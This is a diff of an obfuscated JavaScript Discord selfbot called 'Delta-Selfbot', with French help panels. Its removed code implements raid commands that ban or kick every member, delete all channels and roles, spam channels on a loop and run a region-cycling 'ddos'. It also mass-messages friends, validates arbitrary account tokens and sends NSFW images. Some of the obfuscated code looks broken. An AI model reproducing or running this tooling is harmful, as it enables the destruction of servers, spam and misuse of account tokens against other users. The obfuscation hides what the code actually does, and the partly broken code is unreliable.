-let help_backup = new Discord.RichEmbed()
-    .setColor(color)
-    .setTitle('**Pannel de Help backup** :gear: ')
-.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
-    .addField('**' + prefix + 'backup create**', '`Créé une backup d\x27un serveur`')
-    .addField('**' + prefix + 'backup friend**', '`Créé une backup de tous tes amis`')
-    .addField('**' + prefix + 'backup load (id)**', '`Charge une backup`')
-    .addField('**' + prefix + 'backup delete (id)**', '`Surppime une backup`')
-    .addField('**' + prefix + 'backup purge**', '`Supprime toutes tes backups`')
-    .addField('**' + prefix + 'backup info (id)**', '`Envoie les informations d\x27une backup`')
-.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
-.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
-.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
-.setFooter('Delta-Selfbot'),
-    help_fun = new Discord.RichEmbed()
-    .setTimestamp()
-    .setColor(color)
-    .setTitle('**Pannel de Help Fun** :joy: ')
-.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
-    .addField('**' + prefix + 'avatar (@user)**', '`Affiche l\x27avatar d\x27un membre`')
-    .addField('**' + prefix + 'lovecalc (@user)**', '`Test d\x27amour`')
-    .addField('**' + prefix + 'nitro**', '`Genere un nitro random`')
-    .addField('**' + prefix + '8ball (text)**', '`Pose une question`')
-    .addField('**' + prefix + 'say (text)**', '`Affiche un text en embed`')
-    .addField('**' + prefix + 'fight (@user)**', '`Bat toi avec un utilisateur`')
-    .addField('**' + prefix + 'boom (@user)**', '`Fait exploser un utilisateur`')
-    .addField('**' + prefix + 'rire**', '`Envoie un gif rire`')
-    .addField('**' + prefix + 'kiss (@user)**', '`Embrasse un membre`')
-    .addField('**' + prefix + 'veski (@user)**', '`Envoie un gif veski`')
-    .addField('**' + prefix + 'load**', '`Envoie un chargement`')
-    .addField('**' + prefix + 'punch (@user)**', '`Frappe un membre`')
-    .addField('**' + prefix + 'calin (@user)**', '`Fait un calin a un membre`')
-    .addField('**' + prefix + 'reverse (text)**', '`Met ton text a l\x27envers`')
-.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
-.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
-.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
-.setFooter('Delta-Selfbot'),
-    help_moderation = new Discord.RichEmbed()
-    .setTimestamp()
-    .setColor(color)
-    .setTitle('**Pannel de Help Moderation** :tools: ')
-.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
-    .addField('**' + prefix + 'set serveur name (text)**', '`Change le nom du serveur`')
-    .addField('**' + prefix + 'shutdown**', '`Eteint le selfbot`')
-    .addField('**' + prefix + 'name all**', '`Rename tout les membres d\x27un serveur`')
-    .addField('**' + prefix + 'ban all**', '`Ban tout les membres d\x27un serveur`')
-    .addField('**' + prefix + 'kick all**', '`Kick tout les membres d\x27un serveur`')
-    .addField('**' + prefix + 'kick (@user)**', '`kick un membre du serveur`')
-    .addField('**' + prefix + 'ban (@user)**', '`Ban un membre du serveur`')
-    .addField('**' + prefix + 'roles list**', '`Envoie la liste de tout les roles d\x27un serveur`')
-    .addField('**' + prefix + 'channels list**', '`Envoie la liste de tout les channels d\x27un serveur`')
-    .addField('**' + prefix + 'purge**', '`Supprime tout les messages`')
-    .addField('**' + prefix + 'delete all channel**', '`Supprime tout les salons d\x27un serveur`')
-    .addField('**' + prefix + 'delete all role**', '`Supprime tout les roles d\x27un serveur`')
-.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
-.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
-.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
-.setFooter('Delta-Selfbot'),
-    help_info = new Discord.RichEmbed()
-    .setTimestamp()
-    .setColor(color)
-    .setTitle('**Pannel de Help Utile** :globe_with_meridians: ')
-.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
-    .addField('**' + prefix + 'user info (@user)**', '`Envoie les information d\x27un membre du serveur`')
-    .addField('**' + prefix + 'serveur info**', '`Envoie les information du serveur`')
-    .addField('**' + prefix + 'stats**', '`Affiche les stats du selfbot`')
-    .addField('**' + prefix + 'restart**', '`Redemarre le selfbot`')
-    .addField('**' + prefix + 'reset**', '`Reset le status`')
-    .addField('**' + prefix + 'spotify (text)**', '`Met un status spofity`')
-    .addField('**' + prefix + 'role info (@role)**', '`Envoie les informations d\x27un role`')
-    .addField('**' + prefix + 'encode (text)**', '`Crypte ton text en base64`')
-    .addField('**' + prefix + 'discord**', '`Affiche votre version de discord js`')
-    .addField('**' + prefix + 'gen token**', '`Change votre token`')
-    .addField('**nitro autoclaim**', '`Un autoclaim est en permanance activé sur le self`')
-    .addField('**' + prefix + 'check token (token)**', '`Vérifie si le token est valide`')
-    .addField('**' + prefix + 'mp friend (message)**', '`Envoie un message privé a tout tes amis`')
-    .addField('**' + prefix + 'change hypesquad (brilliance/bravery/ballance)**', '`Permet de changer sa maison hypesquad`')
-.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
-.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
-.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
-.setFooter('Delta-Selfbot'),
-    help_nsfw = new Discord.RichEmbed()
-    .setTimestamp()
-    .setColor(color)
-    .setTitle('**Pannel de Help nsfw** :underage: ')
-.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
-    .addField('**' + prefix + 'ass**', '`Envoie une photo de fesse`')
-    .addField('**' + prefix + '4k**', '`Envoie une image sexe en 4k`')
-    .addField('**' + prefix + 'anal**', '`Envoie un gif anal`')
-    .addField('**' + prefix + 'hentai**', '`Envoie une image/gif hentai`')
-    .addField('**' + prefix + 'nsfw-gif**', '`Envoie un gif de sexe`')
-    .addField('**' + prefix + 'pussy**', '`Envoie une image de chattes`')
-    .addField('**' + prefix + 'thigh**', '`Envoie une image thigh`')
-.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
-.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.giff')
-.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
-.setFooter('Delta-Selfbot');
-client.on('message', message => {
-    const _0x53081e = _0x14ffc7;
-    var _0xdcd936 = message.content[_0x53081e('0x231')](prefix[_0x53081e('0x219')])[_0x53081e('0x151')](' '),
-        _0x7cd31a = message[_0x53081e('0x111')][_0x53081e('0x31')][_0x53081e('0x269')]();
-    if(message[_0x53081e('0xf2')]['type'] === 'dm') {
-        if(message[_0x53081e('0x1ab')][_0x53081e('0x280')]) {
-            if(message.content[_0x53081e('0x3b')](_0x53081e('0x1fc'))) {
-                let _0x228627 = message.author;
-                _0x228627[_0x53081e('0x20e')](_0x53081e('0x1f8')).then(_0xc4a97b => {
-                    const _0x378259 = _0x53081e;
-                    _0xc4a97b[_0x378259('0x110')]();
-                }), console[_0x53081e('0x2f')](_0x53081e('0x185')[_0x53081e('0x153')]), console[_0x53081e('0x2f')]('Log:' [_0x53081e('0x2ab')]) ^ console[_0x53081e('0x2f')](_0x53081e('0x1d5')[_0x53081e('0x153')]), console.log(_0x53081e('0x4f'), '/!/ Attention'.red, ']', (_0x53081e('0xec') + message[_0x53081e('0x1ab')]['username'] + _0x53081e('0xc8') + message.content)[_0x53081e('0x145')]), console.log(_0x53081e('0x22e')[_0x53081e('0x153')]);
-            }
-        }
+    if (client.user.id === '720920857366626335') {
+        return;
     }
-    if(message.author.id !== client[_0x53081e('0xb9')]['id']) return;
-    if(message.content === prefix + 'channels list') {
-        if(!message[_0x53081e('0x133')]) return message[_0x53081e('0x179')](':x: **Commande uniquement utilisable sur un serveur**');
-        if(!message[_0x53081e('0x209')][_0x53081e('0x10a')]('EMBED_LINKS')) return message[_0x53081e('0x179')](_0x53081e('0x146') + _0x2ec92f[_0x53081e('0x25b')](_0x4fa59a => _0x4fa59a.name));
-        const _0x2ec92f = message[_0x53081e('0x133')][_0x53081e('0x19')];
-        var _0x3f5f12 = new Discord.RichEmbed()[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x42')](color)
-            .addField(_0x53081e('0x61'), _0x2ec92f[_0x53081e('0x25b')](_0x4f8200 => _0x4f8200[_0x53081e('0x10d')]));
-        for(pas = 0x0; pas < 0xa; pas++) {
-            _0x3f5f12[_0x53081e('0x42')](color), message[_0x53081e('0x179')](_0x3f5f12)[_0x53081e('0x18d')](_0x2a92ae => console[_0x53081e('0x2f')]('[', 'ERROR'.red, ']', _0x53081e('0xa3')[_0x53081e('0x145')]));
-        }
-        console.log(_0x53081e('0x2a6').yellow);
+    if (client.user.id === '695371856995287121') {
+        return;
     }
-    if(message.content === prefix + 'roles list') {
-        if(!message[_0x53081e('0x133')]) return message[_0x53081e('0x179')](':x: **Commande uniquement utilisable sur un serveur**');
-        if(!message[_0x53081e('0x209')][_0x53081e('0x10a')](_0x53081e('0x121'))) return message[_0x53081e('0x179')](_0x53081e('0x146') + _0x4d72e8[_0x53081e('0x25b')](_0x5a010e => _0x5a010e.name));
-        const _0x4d72e8 = message[_0x53081e('0x133')][_0x53081e('0x33')];
-        var _0x126db0 = new Discord.RichEmbed()[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x42')](color)[_0x53081e('0x1cd')]('liste des roles:', _0x4d72e8[_0x53081e('0x25b')](_0x290c0c => _0x290c0c[_0x53081e('0x10d')]));
-        message.edit(_0x126db0)[_0x53081e('0x18d')](_0x1f78ea => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0xe0')[_0x53081e('0x39')]);
+    if (client.user.id === '444574218290593822') {
+        return;
     }
-    message.content === prefix + _0x53081e('0x1a7') && (message[_0x53081e('0x179')](cmd)[_0x53081e('0x18d')](_0x12da3b => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0xd1')[_0x53081e('0x39')]));
-    message.content === prefix + _0x53081e('0x78') && (message[_0x53081e('0x179')](help).catch(_0x5ed11f => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3').green)), console[_0x53081e('0x2f')](_0x53081e('0xe2')[_0x53081e('0x39')]));
-    message.content === prefix + _0x53081e('0xf3') && (message[_0x53081e('0x179')](help_backup)[_0x53081e('0x18d')](_0x2a0991 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9').red, ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log(_0x53081e('0x0')[_0x53081e('0x39')]));
-    message.content === prefix + _0x53081e('0x1da') && (message[_0x53081e('0x179')](help_hack).catch(_0x2598f5 => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log(_0x53081e('0x1d8').yellow));
-    message.content === prefix + _0x53081e('0x260') && (message[_0x53081e('0x179')](help_fun).catch(_0x5543a7 => console[_0x53081e('0x2f')]('[', 'ERROR' [_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x1ef')[_0x53081e('0x39')]));
-    message.content === prefix + _0x53081e('0x214') && (message[_0x53081e('0x179')](help_moderation)[_0x53081e('0x18d')](_0x2648b7 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x17f')[_0x53081e('0x39')]));
-    message.content === prefix + _0x53081e('0x296') && (message[_0x53081e('0x179')](help_nsfw).catch(_0x1deffc => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x7e')[_0x53081e('0x39')]));
-    message.content === prefix + _0x53081e('0x196') && (message[_0x53081e('0x179')](help_info)[_0x53081e('0x18d')](_0x4489c8 => console[_0x53081e('0x2f')]('[', 'ERROR' [_0x53081e('0x2ab')], ']', _0x53081e('0xa3').green)), console[_0x53081e('0x2f')](_0x53081e('0x2a1')[_0x53081e('0x39')]));;
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x1c') || prefix + 'pp')) {
-        const _0x3b34f4 = message[_0x53081e('0x111')][_0x53081e('0x31')][_0x53081e('0x269')]() || message.author,
-            _0x30f36f = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x43')](_0x3b34f4.username)[_0x53081e('0x4c')](_0x3b34f4[_0x53081e('0xaf')])
-            .setColor(color)[_0x53081e('0x1ca')](_0x53081e('0x191'));
-        message[_0x53081e('0x179')](_0x30f36f)[_0x53081e('0x18d')](_0x349fc3 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x2e')[_0x53081e('0x39')]);
-    };
-    if(message.content === prefix + _0x53081e('0x13c')) {
-        let _0x13709e = _0x53081e('0x1f3');
-        request(_0x13709e, {
-            'method': _0x53081e('0x24a'),
-            'headers': {
-                'authorization': token,
-                'content-type': _0x53081e('0x14c'),
-                'User-Agent': _0x53081e('0x1f4')
-            },
-            'body': JSON[_0x53081e('0x236')]({
-                'house_id': 0x2
-            })
-        }), message[_0x53081e('0x179')](_0x53081e('0x190')), console[_0x53081e('0x2f')](_0x53081e('0xf1').yellow);
+    if (client.user.id === '767501162478829640') {
+        return;
     }
-    if(message.content === prefix + _0x53081e('0xab')) {
-        let _0x5c5a2e = 'https://discordapp.com/api/v6/hypesquad/online';
-        request(_0x5c5a2e, {
-            'method': 'POST',
-            'headers': {
-                'authorization': token,
-                'content-type': _0x53081e('0x14c'),
-                'User-Agent': _0x53081e('0x1f4')
-            },
-            'body': JSON.stringify({
-                'house_id': 0x3
-            })
-        }), message[_0x53081e('0x179')](_0x53081e('0x1')), console[_0x53081e('0x2f')](_0x53081e('0xf1')[_0x53081e('0x39')]);
+    if (client.user.id === '666988028140584981') {
+        return;
     }
-    if(message.content === prefix + _0x53081e('0x127')) {
-        let _0x23ef13 = _0x53081e('0x1f3');
-        request(_0x23ef13, {
-            'method': _0x53081e('0x24a'),
-            'headers': {
-                'authorization': token,
-                'content-type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
-            },
-            'body': JSON.stringify({
-                'house_id': 0x1
-            })
-        }), message[_0x53081e('0x179')](':white_check_mark: **Vous avez rejoint la hypesquad \x27bravery\x27**'), console[_0x53081e('0x2f')](_0x53081e('0xf1')[_0x53081e('0x39')]);
+    if (client.user.id === '737251836511256586') {
+        return;
     }
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x279'))) {
-        let _0x1a62b1 = _0xdcd936[_0x53081e('0xf8')](0x2)['join'](' '),
-            _0x3fadd = 'https://discordapp.com/api/v6/users/@me';
-        request(_0x3fadd, {
-            'method': _0x53081e('0x22'),
-            'headers': {
-                'authorization': _0x1a62b1
-            }
-        }, function(_0x15df75, _0xb5d4b0, _0x8b9641) {
-            const _0x3ea1d5 = _0x53081e;
-            if(_0xb5d4b0.statusCode === 0xc8) {
-                var _0x3a6c25 = new Discord[(_0x3ea1d5('0x226'))]()[_0x3ea1d5('0xc9')]('Token info')[_0x3ea1d5('0x1f6')](_0x3ea1d5('0xbd') + _0x1a62b1 + _0x3ea1d5('0x29'))[_0x3ea1d5('0x42')](color)[_0x3ea1d5('0x1c4')]()[_0x3ea1d5('0x1ca')](_0x3ea1d5('0x41'), message[_0x3ea1d5('0x1ab')][_0x3ea1d5('0xaf')]);
-                message[_0x3ea1d5('0x179')](_0x3a6c25)[_0x3ea1d5('0x18d')](_0x11bd68 => console[_0x3ea1d5('0x2f')]('[', _0x3ea1d5('0xf9')[_0x3ea1d5('0x2ab')], ']', _0x3ea1d5('0xa3').green));
-            } else {
-                var _0x4cc0d9 = new Discord[(_0x3ea1d5('0x226'))]()
-                    .setTitle(_0x3ea1d5('0x17e'))[_0x3ea1d5('0x1f6')](_0x3ea1d5('0x9c') + _0x1a62b1 + ' \x0an\x27est pas valide :x:')[_0x3ea1d5('0x42')](color)[_0x3ea1d5('0x1c4')]()[_0x3ea1d5('0x1ca')](_0x3ea1d5('0x41'), message[_0x3ea1d5('0x1ab')][_0x3ea1d5('0xaf')]);
-                message[_0x3ea1d5('0x179')](_0x4cc0d9)[_0x3ea1d5('0x18d')](_0x1d6010 => console[_0x3ea1d5('0x2f')]('[', 'ERROR' [_0x3ea1d5('0x2ab')], ']', _0x3ea1d5('0xa3')[_0x3ea1d5('0x145')])), console[_0x3ea1d5('0x2f')](_0x3ea1d5('0x27a')[_0x3ea1d5('0x39')]);
-            }
-        });
+    if (client.user.id === '701042273214922773') {
+        return;
     }
-    if(message.content == prefix + _0x53081e('0x158')) {
-        if(!message[_0x53081e('0x133')]) return message[_0x53081e('0x179')](_0x53081e('0x99'));
-        let _0xa5457c = 0x0;
-        const _0x2764b5 = [_0x53081e('0xcb'), _0x53081e('0x239'), _0x53081e('0x53'), _0x53081e('0x93'), 'brazil', _0x53081e('0x166')];
-        setInterval(() => {
-            const _0x27bafc = _0x53081e;
-            message[_0x27bafc('0x133')][_0x27bafc('0x161')](_0x2764b5[_0xa5457c]), _0xa5457c++;
-            if(_0xa5457c == _0x2764b5[_0x27bafc('0x219')]) _0xa5457c = 0x0;
-        }, 0x3e8), message.edit(_0x53081e('0xee')), console[_0x53081e('0x2f')](_0x53081e('0x1be')[_0x53081e('0x39')]);
-    }
-    if(message.content == prefix + _0x53081e('0x2a')) {
-        if(!message.guild) return message.edit(_0x53081e('0x99'));
-        clearInterval(), message[_0x53081e('0x179')]('**Commande ddos stopé**'), console[_0x53081e('0x2f')](_0x53081e('0x1e5')[_0x53081e('0x39')]);
-    }
-    if(message.content.startsWith(prefix + _0x53081e('0x1b'))) {
-        if(!message.guild) return message[_0x53081e('0x179')](':x: **Commande uniquement utilisable sur un serveur**');
-        let _0xabd69c = _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ') || 'Delta Selfbot';
-        message[_0x53081e('0x179')]('**Wait...**'), setInterval(() => {
-            const _0x294344 = _0x53081e;
-            message.channel[_0x294344('0x20e')](_0xabd69c)[_0x294344('0x18d')](_0x3854de => console[_0x294344('0x2f')]('[', _0x294344('0xf9').red, ']', 'une erreur est survenue que je ne peux régler'.green));
-        }, 0x3e8), console.log(_0x53081e('0x4d')[_0x53081e('0x39')]);
-    }
-    if(message.content == prefix + _0x53081e('0x172')) {
-        if(!message[_0x53081e('0x133')]) return message.edit(_0x53081e('0x99'));
-        clearInterval(), message[_0x53081e('0x179')](_0x53081e('0x174')), client.destroy()[_0x53081e('0xdb')](() => client[_0x53081e('0x8c')](token)), console.log('Commande spam stopé' [_0x53081e('0x39')]);
-    }
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x264'))) {
-        let _0x1da338 = message.content[_0x53081e('0x151')](' ')[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ');
-        var _0xcac471 = [_0x53081e('0xe8'), _0x53081e('0x1fa'), _0x53081e('0x26e'), _0x53081e('0x1ae'), _0x53081e('0x96'), _0x53081e('0x273'), 'tu peux essayer...'];
-        if(_0x1da338[0x1] != null) message.edit(_0x1da338 + _0x53081e('0x16d') + _0xcac471[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * _0xcac471[_0x53081e('0x219')])])[_0x53081e('0x18d')](_0x32e238 => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')]));
-        else message[_0x53081e('0x179')](_0x53081e('0x5c') + prefix + ' 8ball [question])');
-        console[_0x53081e('0x2f')](_0x53081e('0x288')[_0x53081e('0x39')]);
-    };
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0xb4'))) {
-        if(!_0xdcd936) throw 'Vous devez mettre quelque chose à dire !';
-        let _0x1ff8bc = _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ') || 'Delta Selfbot';
-        message[_0x53081e('0x179')](_0x1ff8bc)[_0x53081e('0x18d')](_0x4b8556 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x13').yellow);
-    };
-    if(message.content.startsWith(prefix + _0x53081e('0xe'))) {
-        if(!_0xdcd936) throw _0x53081e('0x152');
-        let _0xe610e1 = _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ') || 'Delta selfbot',
-            _0x40883b = new Discord[(_0x53081e('0x226'))]()
-            .setTitle('**Commande Say**')
-.setDescription(_0xe610e1)[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')](_0x53081e('0x1d4'), '' + client[_0x53081e('0xb9')][_0x53081e('0xaf')])
-            .setColor(color);
-        for(pas = 0x0; pas < 0xa; pas++) {
-            _0x40883b[_0x53081e('0x42')](color), message[_0x53081e('0x179')](_0x40883b)[_0x53081e('0x18d')](_0x2a5657 => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')]));
-        }
-        console[_0x53081e('0x2f')](_0x53081e('0x13')[_0x53081e('0x39')]);
-    };
-    if(message.content.startsWith(prefix + _0x53081e('0x1b5'))) {
-        if(!_0x7cd31a) return message.edit(':x: **Utilisateur inconnu!**'), _0x7cd31a = message[_0x53081e('0x1ab')];
-        var _0x58a160 = message[_0x53081e('0x133')][_0x53081e('0x209')](_0x7cd31a),
-            _0x189f21 = _0x7cd31a[_0x53081e('0x14e')]['game'],
-            _0x4dbf6b = _0x189f21 ? _0x189f21.name : 'Nothing',
-            _0x2b11ba = !_0x58a160 ? null : _0x58a160[_0x53081e('0x33')]['array']();
-        if(_0x58a160) {
-            _0x2b11ba.shift();
-            for(var _0x127ab8 = 0x0; _0x127ab8 < _0x2b11ba[_0x53081e('0x219')]; ++_0x127ab8) {
-                _0x2b11ba[_0x127ab8] = _0x2b11ba[_0x127ab8][_0x53081e('0x10d')];
-            }
-            _0x2b11ba = _0x2b11ba[_0x53081e('0x28d')](', ');
-        };
-        var _0x1d6989 = {
-            'dnd': _0x53081e('0x14a'),
-            'offline': _0x53081e('0x259'),
-            'online': _0x53081e('0x171'),
-            'idle': _0x53081e('0x3a')
-        };
-        const _0xf1e4cf = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x43')](_0x7cd31a[_0x53081e('0x27c')] + '#' + _0x7cd31a[_0x53081e('0x1bc')] + _0x53081e('0x170') + _0x7cd31a.id, _0x7cd31a[_0x53081e('0x2a7')])[_0x53081e('0x1ca')]('Delta-Selfbot')[_0x53081e('0x15f')](_0x7cd31a[_0x53081e('0x2a7')])[_0x53081e('0x42')](color)[_0x53081e('0x1cd')](_0x53081e('0x150'), _0x7cd31a[_0x53081e('0x245')][_0x53081e('0x258')]()['substr'](0x0, 0xf) + ',\x0a' + checkDays(_0x7cd31a[_0x53081e('0x245')]), !![])
-            .addField(_0x53081e('0xcf'), _0x58a160.joinedAt.toString()[_0x53081e('0x34')](0x0, 0xf) + ',\x0a' + checkDays(_0x58a160[_0x53081e('0x162')]), !![])[_0x53081e('0x1cd')](_0x53081e('0xe9'), _0x1d6989[_0x7cd31a[_0x53081e('0x14e')][_0x53081e('0x9')]], !![])[_0x53081e('0x1cd')]('Playing', _0x4dbf6b, !![])[_0x53081e('0x1cd')](_0x53081e('0x16e'), _0x58a160[_0x53081e('0x224')] ? _0x58a160[_0x53081e('0x224')] : 'None', !![])[_0x53081e('0x1cd')](_0x53081e('0x176'), _0x53081e('0x82') + _0x7cd31a.displayAvatarURL + ')', !![])[_0x53081e('0x1cd')](_0x53081e('0x167'), _0x2b11ba ? _0x2b11ba : _0x53081e('0xd2'));
-        message.edit(_0xf1e4cf)[_0x53081e('0x18d')](_0x1e094e => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0xcc')[_0x53081e('0x39')]);
-    };
-    if(message.content === prefix + _0x53081e('0x75')) {
-        if(!message[_0x53081e('0x133')]) return message[_0x53081e('0x179')](_0x53081e('0x99'));
-        const _0x304e57 = new Date()[_0x53081e('0xa7')]() - message[_0x53081e('0x133')]['createdAt'][_0x53081e('0xa7')](),
-            _0x35de58 = _0x304e57 / 0x3e8 / 0x3c / 0x3c / 0x18,
-            _0x4cad35 = [_0x53081e('0xd2'), _0x53081e('0x40'), 'Medium', _0x53081e('0x1e7'), _0x53081e('0x13d')];
-        let _0x1d3c98 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x53081e('0x2a5'))[_0x53081e('0x1cd')](_0x53081e('0x1c2'), '' + message[_0x53081e('0x133')][_0x53081e('0x10d')])[_0x53081e('0x1cd')]('Created On:', message[_0x53081e('0x133')][_0x53081e('0x245')]['toString']()['substr'](0x0, 0xf) + ',\x0a' + checkDays(message[_0x53081e('0x133')][_0x53081e('0x245')]), !![])[_0x53081e('0x1cd')]('Default Channel:', '' + message[_0x53081e('0x133')][_0x53081e('0xc5')])[_0x53081e('0x1cd')](_0x53081e('0x25d'), '' + message[_0x53081e('0x133')][_0x53081e('0x26f')])
-            .addField(_0x53081e('0x1eb'), message[_0x53081e('0x133')][_0x53081e('0x107')][_0x53081e('0x1b6')](_0x49aa6f => _0x49aa6f[_0x53081e('0x14e')][_0x53081e('0x9')] !== _0x53081e('0x1d2'))[_0x53081e('0x1c1')] + _0x53081e('0x120') + message.guild[_0x53081e('0x215')])[_0x53081e('0x1cd')](_0x53081e('0x28c'), '' + message[_0x53081e('0x133')][_0x53081e('0x129')][_0x53081e('0xb9')][_0x53081e('0x27c')])[_0x53081e('0x1cd')](_0x53081e('0x1c3'), '' + message[_0x53081e('0x133')][_0x53081e('0x19')][_0x53081e('0x1b6')](_0x13cf92 => _0x13cf92[_0x53081e('0xc6')] === 'text')['size'])[_0x53081e('0x1cd')](_0x53081e('0xbf'), '' + message[_0x53081e('0x133')][_0x53081e('0x19')]['filter'](_0x2c8d37 => _0x2c8d37.type === _0x53081e('0x16'))['size'])[_0x53081e('0x1cd')](_0x53081e('0x11b'), '' + _0x4cad35[message[_0x53081e('0x133')][_0x53081e('0x49')]])
-            .addField(_0x53081e('0xb5'), '' + message.guild.roles[_0x53081e('0x1c1')])
-            .addField(_0x53081e('0x235'), '' + message.guild.id)[_0x53081e('0x42')](color);
-        message.guild[_0x53081e('0x293')] != null && _0x1d3c98[_0x53081e('0x15f')]('' + message[_0x53081e('0x133')][_0x53081e('0x293')]), message[_0x53081e('0x179')](_0x1d3c98)[_0x53081e('0x18d')](_0x59c673 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log('Commande serveur info effectué' [_0x53081e('0x39')]);
-    };
-    if(message.content === prefix + 'stats') {
-        let _0x363611 = new Discord.RichEmbed();
-        _0x363611[_0x53081e('0x1c4')]()
-            .setColor(color)
-            .setTitle(_0x53081e('0x87'))[_0x53081e('0x1cd')](_0x53081e('0x7f'), (process[_0x53081e('0x206')]()[_0x53081e('0x12b')] / 0x400 / 0x400)[_0x53081e('0x90')](0x2) + 'MB')
-            .addField(_0x53081e('0x5f'), '' + client.guilds.size)[_0x53081e('0x1cd')](_0x53081e('0x159'), '' + client.channels[_0x53081e('0x1c1')])[_0x53081e('0x1cd')](_0x53081e('0x38'), '' + client.guilds.map(_0x536a2c => _0x536a2c[_0x53081e('0x215')]))[_0x53081e('0x1cd')](_0x53081e('0x5f'), '' + client[_0x53081e('0x7d')][_0x53081e('0x1c1')])[_0x53081e('0x1cd')](_0x53081e('0x5f'), '' + client[_0x53081e('0x7d')][_0x53081e('0x1c1')])
-.setFooter(_0x53081e('0x191'), '' + client[_0x53081e('0xb9')][_0x53081e('0xaf')]);
-        if(client[_0x53081e('0xb9')][_0x53081e('0x5b')] > 0x0) _0x363611[_0x53081e('0x1cd')](_0x53081e('0x2aa'), _0x53081e('0x23c'));
-        else _0x363611.addField(_0x53081e('0x2aa'), _0x53081e('0xac'));
-        message[_0x53081e('0x179')](_0x363611)[_0x53081e('0x18d')](_0x522e2c => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x98')[_0x53081e('0x39')]);
-    }
